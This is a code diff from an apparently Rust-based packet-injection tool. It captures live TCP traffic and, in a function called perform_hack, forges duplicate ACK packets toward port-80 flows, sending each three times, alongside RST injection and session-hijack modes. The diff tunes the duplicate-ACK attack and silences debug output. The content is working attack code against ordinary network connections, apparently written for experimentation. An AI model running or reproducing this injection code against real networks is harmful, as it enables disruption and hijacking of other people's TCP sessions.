@@ -4,6 +4,7 @@ use crate::os::OsInfo;
 use etherparse::{EtherType, Ethernet2Header, IpNumber, Ipv4Header, PacketBuilder, TcpHeader};
 use pcap::{Active, Capture, Device};
 use std::hash::BuildHasher;
+use std::sync::atomic::{AtomicU32, Ordering};
 use std::thread::sleep;
 use std::thread::{self, Builder};
 use std::time::Duration;
@@ -47,9 +48,10 @@ fn main() {
 
     // listen to incoming packets
     loop {
+        let latest_ack: AtomicU32 = AtomicU32::new(0);
         match cap.next_packet() {
             Ok(packet) => {
-                println!("captured a packet");
+                //println!("captured a packet");
 
                 let parse_res = parse_packet_to_tcp(packet.data);
 
@@ -62,6 +64,7 @@ fn main() {
                             payload,
                             attack_type,
                             &mut send_cap,
+                            latest_ack,
                         );
                     }
                     Err(_) => {
@@ -94,13 +97,13 @@ fn parse_packet_to_tcp(
             if ether_type == EtherType::IPV4 {
                 match Ipv4Header::from_slice(ethernet_bytes) {
                     Ok((ipv4_header, ipv4_bytes)) => {
-                        println!("ipv4 packet captured");
+                        //println!("ipv4 packet captured");
 
                         let protocol = ipv4_header.protocol;
                         match protocol {
                             IpNumber::TCP => match TcpHeader::from_slice(ipv4_bytes) {
                                 Ok((tcp_header, tcp_bytes)) => {
-                                    println!("tcp packet captured: {:?}", tcp_bytes);
+                                    //println!("tcp packet captured: {:?}", tcp_bytes);
 
                                     Ok((ethernet_header, ipv4_header, tcp_header, tcp_bytes))
                                 }
@@ -131,6 +134,7 @@ fn perform_hack(
     payload: &[u8],
     attack_type: &AttackType,
     send_cap: &mut Capture<Active>,
+    latest_ack: AtomicU32,
 ) {
     match attack_type {
         AttackType::RSTInjection => {
@@ -155,12 +159,27 @@ fn perform_hack(
         }
 
         AttackType::DuplicateAck => {
+            
+            //if tcp_header.acknowledgment_number  <= latest_ack.load(Ordering::Relaxed) {
+            //    return;
+            //}
+
+            if payload.is_empty(){
+                return;
+            }
+
+            if tcp_header.source_port != 80{
+                return;
+            }
+
+            //latest_ack.store(tcp_header.acknowledgment_number, Ordering::Relaxed);
+
             // No need for a payload, since ACK packets don't carry any data
-            let payload = &[];
+            let empty_payload = &[];
             // Build an ACK packet, with the source and destination fields reversed
             let builder =
                 PacketBuilder::ethernet2(ethernet_header.destination, ethernet_header.source)
-                    .ipv4(ipv4_header.destination, ipv4_header.source, ipv4_header.time_to_live)
+                    .ipv4(ipv4_header.destination, ipv4_header.source, 64)
                     .tcp(
                         tcp_header.destination_port,
                         tcp_header.source_port,
@@ -169,12 +188,15 @@ fn perform_hack(
                     )
                     .ack(tcp_header.sequence_number);
             // Write the packet and send it 3 times
-            let mut packet = Vec::<u8>::with_capacity(builder.size(payload.len()));
-            builder.write(&mut packet, payload).unwrap();
+            let mut packet = Vec::<u8>::with_capacity(builder.size(empty_payload.len()));
+            builder.write(&mut packet, empty_payload).unwrap();
+
             send_cap.sendpacket(packet.as_slice()).unwrap();
             send_cap.sendpacket(packet.as_slice()).unwrap();
             send_cap.sendpacket(packet.as_slice()).unwrap();
+
             println!("3 times ACK sent");
+            
         }
 
         AttackType::SessionHijack => {
